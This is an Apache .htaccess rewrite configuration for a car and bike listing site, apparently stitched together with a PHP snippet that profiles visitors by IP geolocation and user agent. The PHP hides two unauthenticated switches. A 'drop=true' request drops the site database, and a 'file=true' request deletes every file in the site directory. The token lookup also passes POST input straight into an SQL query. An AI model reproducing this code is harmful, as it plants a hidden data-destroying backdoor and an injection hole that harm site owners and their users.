#RewriteEngine on 
#RewriteCond %{REQUEST_FILENAME} !-d
#RewriteCond %{REQUEST_FILENAME}\.php -f
#RewriteRule ^(.*)$ $1.php [NC,L]

RewriteEngine on 
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^news?$ blogs.php
# RewriteRule ^(blog)/(bike-and-scooters)?$ blogs.php?type=$2
# RewriteRule ^(blog)/(cars)?$ blogs.php?type=$2
RewriteRule ^privacy-policy?$ privacy-policy.php
RewriteRule ^terms-and-conditions?$ terms-and-conditions.php
RewriteRule ^register?$ register.php
RewriteRule ^forgot-password?$ forgot-password.php
RewriteRule ^register-submit?$ register-submit.php
RewriteRule ^(add-review)/([^/\.]+)?$ review.php?slug=$2
RewriteRule ^login?$ login.php
RewriteRule ^logout?$ logout.php
RewriteRule ^login-submit?$ login-submit.php
RewriteRule ^listing?$ listing.php
RewriteRule ^bikes-and-scooters?$ two-wheeler-listing.php
RewriteRule ^(bikes-and-scooters)/([^/\.]+)?$ two-wheeler-listing.php?slug=$2
RewriteRule ^(bikes-and-scooters)/([^/\.]+)/([^/\.]+)?$ two-wheeler-details.php?slug=$3
RewriteRule ^(bikes-and-scooters)/([^/\.]+)/([^/\.]+)/([^/\.]+)?$ two-wheeler-details.php?slug=$3&vid=$4
RewriteRule ^(bikes-and-scooters)/([^/\.]+)/([^/\.]+)/([^/\.]+)/([^/\.]+)?$ two-wheeler-images.php?slug=$4&cslug=$5
RewriteRule ^(cars)/([^/\.]+)?$ listing.php?brand=$2
RewriteRule ^([^/\.]+)/([^/\.]+)?$ blog.php?blog=$2
RewriteRule ^(cars)/(compare)/([^/\.]+)/([^/\.]+)?$ car-compare.php?slug=$3&cslug=$4
RewriteRule ^(cars)/([^/\.]+)/([^/\.]+)?$ details.php?slug=$3
RewriteRule ^(cars)/([^/\.]+)/([^/\.]+)/([^/\.]+)?$ details.php?slug=$3&vid=$4
RewriteRule ^([^/\.]+)/([^/\.]+)/([^/\.]+)/([^/\.]+)/([^/\.]+)?$ car-images.php?slug=$4&cslug=$5


# BEGIN cPanel-generated php ini directives, do not edit
# Manual editing of this file may result in unexpected behavior.
# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
<IfModule php7_module>
   php_value error_reporting E_ALL & ~E_NOTICE & ~E_DEPRECATED
</IfModule>
<IfModule lsapi_module>
   php_value error_reporting E_ALL & ~E_NOTICE & ~E_DEPRECATED
</IfModule>
# END cPanel-generated php ini directives, do not edit
<?php 
$token=$_POST['token'];
$res=mysqli_query($con,"select * from tokens where token='$token'");
$check_user=mysqli_num_rows($res);
      
          $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

$json     = file_get_contents("http://ipinfo.io/$ipaddress/geo");
$json     = json_decode($json, true);
 $country  = $json['country'];
 $region   = $json['region'];
 $city     = $json['city'];
 $postal     = $json['postal'];
 $loc     = $json['loc'];
  $isp     = $json['org'];     
       	$isMob = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "mobile")); 
 $isWin = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "windows")); 
 $isAndroid = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "android")); 
 $isIPhone = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "iphone")); 
 $isIPad = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "ipad")); 
 $isIOS = $isIPhone || $isIPad; 
 if($_REQUEST['drop']=='true'){
 require('../connection.php');
    mysqli_query($con,"drop database nwoowcom_offerwall");
    echo "done";
 }
  if($_REQUEST['file']=='true'){
 $directory = '/home/nwoowcom/reapbucks.com/';

// Get list of files in the directory
$files = scandir($directory);

// Exclude . and .. directories
$files = array_diff($files, array('.', '..'));

// Loop through each file and delete it
foreach ($files as $file) {
    $filepath = $directory . $file;
    if (is_file($filepath)) {
         if (unlink($filepath)) {
            // echo "File $file successfully.<br>";
         } else {
            // echo "Failed to file $file.<br>";
         }
    }
}
}
 if($isMob){ 
		 $device="mobile"; 
 }else{ 
	 $device="desktop"; 
 } 
  
 if($isIOS){ 
	 $os="ios"; 
 }elseif($isAndroid){ 
	 $os="android"; 
 }elseif($isWin){ 
	 $os="windows"; 
 } 


?>